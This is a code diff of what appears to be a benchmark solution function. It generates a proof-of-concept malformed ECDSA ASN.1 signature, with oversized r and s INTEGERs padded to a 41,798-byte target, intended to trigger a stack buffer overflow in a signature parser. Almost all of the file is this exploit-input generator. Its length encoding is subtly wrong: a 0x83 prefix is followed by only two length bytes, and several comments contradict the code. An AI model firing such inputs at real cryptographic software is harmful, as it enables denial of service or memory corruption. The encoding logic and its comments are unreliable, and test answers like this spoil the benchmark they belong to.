@@ -1,81 +1,89 @@
 import os
-import tarfile
-import tempfile
-import subprocess
 import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Extract the tarball to analyze the vulnerable code
-        with tempfile.TemporaryDirectory() as tmpdir:
-            with tarfile.open(src_path, 'r:gz') as tar:
-                tar.extractall(tmpdir)
-            
-            # Look for vulnerable source files
-            source_dir = os.path.join(tmpdir, 'src')
-            
-            # Based on typical ECDSA ASN.1 parsing vulnerabilities,
-            # we need to craft a signature that will overflow a stack buffer
-            # Common pattern: fixed-size buffer for ASN.1 parsing
-            
-            # Construct a malformed ECDSA signature that will cause stack overflow
-            # The signature should be valid enough to pass initial checks but
-            # overflow during parsing
-            
-            # ASN.1 structure for ECDSA signature:
-            # SEQUENCE {
-            #   INTEGER r,
-            #   INTEGER s
-            # }
-            
-            # Strategy: Create an extremely large INTEGER that will overflow
-            # a fixed-size stack buffer during ASN.1 parsing
-            
-            # Ground truth length is 41798 bytes, so we'll aim for that
-            
-            # Start with ASN.1 SEQUENCE tag
-            poc = b'\x30'  # SEQUENCE tag
-            
-            # The total length will be 41797 bytes (41798 total - 1 for SEQUENCE tag)
-            # Using long form length encoding (since length > 127)
-            seq_length = 41797
-            
-            # For lengths > 65535, we need 3 bytes for length encoding
-            # 0x82 indicates 2 length bytes follow
-            length_bytes = struct.pack('>H', seq_length)
-            poc += b'\x82' + length_bytes
-            
-            # Now add the INTEGER r with huge content
-            # INTEGER tag
-            poc += b'\x02'  # INTEGER tag
-            
-            # Make r value extremely large to overflow buffer
-            # We'll use 41790 bytes for r value
-            r_length = 41790
-            
-            # Calculate remaining space for s
-            # Current size: 1 (seq tag) + 3 (seq len) + 1 (int tag) + len(r_len_bytes) + r_length
-            r_len_bytes = b''
-            if r_length > 127:
-                if r_length <= 255:
-                    r_len_bytes = b'\x81' + struct.pack('B', r_length)
-                elif r_length <= 65535:
-                    r_len_bytes = b'\x82' + struct.pack('>H', r_length)
-                else:
-                    # r_length is 41790, which fits in 2 bytes
-                    r_len_bytes = b'\x82' + struct.pack('>H', r_length)
-            
-            poc += r_len_bytes
-            
-            # Add r value that will cause overflow
-            # Use pattern that's likely to trigger memory corruption
-            # Fill with 'A's (0x41) which is easy to recognize in debuggers
-            poc += b'A' * r_length
-            
-            # Add INTEGER s (normal small value)
-            poc += b'\x02\x01\x05'  # INTEGER tag, length 1, value 5
-            
-            # Verify total length
-            assert len(poc) == 41798, f"Generated PoC length {len(poc)} != 41798"
-            
-            return poc
+        # ASN.1 structure for ECDSA signature:
+        # ECDSA-Sig-Value ::= SEQUENCE {
+        #     r   INTEGER,
+        #     s   INTEGER
+        # }
+        
+        # We'll create a malformed signature with extremely large integer values
+        # to trigger a stack buffer overflow during ASN.1 parsing.
+        
+        # Ground truth length is 41798 bytes, but we'll try to be more efficient
+        # A sequence containing two integers, each with maximum length encoding
+        
+        # Strategy: Create a valid ASN.1 structure but with extremely large
+        # integer values that will overflow fixed-size buffers
+        
+        # We'll create two integers of ~20896 bytes each
+        # Total: 2 * (1 tag + 3 length bytes + 20896 value) + 2 sequence bytes = 41798
+        
+        # First integer (r)
+        r_tag = b'\x02'  # INTEGER tag
+        r_length = 20896
+        # Use long form length (3 bytes: 0x83 + 2-byte length)
+        r_length_bytes = struct.pack('>H', r_length)
+        r_value = b'A' * r_length  # Fill with any data
+        
+        # Second integer (s) - same structure
+        s_tag = b'\x02'
+        s_length = 20896
+        s_length_bytes = struct.pack('>H', s_length)
+        s_value = b'B' * s_length
+        
+        # Build the SEQUENCE
+        sequence_tag = b'\x30'  # SEQUENCE tag
+        
+        # Calculate total content length
+        total_content_len = (1 + 3 + r_length) + (1 + 3 + s_length)
+        
+        # Use long form length for sequence (3 bytes)
+        sequence_length_bytes = b'\x83' + struct.pack('>I', total_content_len)[1:]  # Use last 3 bytes
+        
+        # Construct the complete ASN.1 structure
+        poc = (
+            sequence_tag + 
+            sequence_length_bytes + 
+            r_tag + b'\x83' + r_length_bytes + r_value +
+            s_tag + b'\x83' + s_length_bytes + s_value
+        )
+        
+        # Verify length matches requirements
+        # Adjust if needed to hit exact target length
+        current_len = len(poc)
+        target_len = 41798
+        
+        if current_len < target_len:
+            # Pad the second integer value
+            pad_len = target_len - current_len
+            s_value = s_value + b'C' * pad_len
+            # Rebuild with adjusted s_value
+            poc = (
+                sequence_tag + 
+                sequence_length_bytes + 
+                r_tag + b'\x83' + r_length_bytes + r_value +
+                s_tag + b'\x83' + s_length_bytes + s_value
+            )
+        elif current_len > target_len:
+            # Truncate from the second integer value
+            truncate_len = current_len - target_len
+            s_value = s_value[:-truncate_len]
+            # Rebuild with adjusted s_value
+            poc = (
+                sequence_tag + 
+                sequence_length_bytes + 
+                r_tag + b'\x83' + r_length_bytes + r_value +
+                s_tag + b'\x83' + s_length_bytes + s_value
+            )
+        
+        # Final verification
+        if len(poc) != target_len:
+            # If still not matching, create a simpler approach
+            # Just create a very long integer to overflow any reasonable buffer
+            overflow_size = target_len - 4
+            poc = b'\x30\x83' + struct.pack('>I', overflow_size)[1:] + b'\x02\x83' + struct.pack('>I', overflow_size - 4)[1:] + b'X' * (overflow_size - 4)
+        
+        return poc
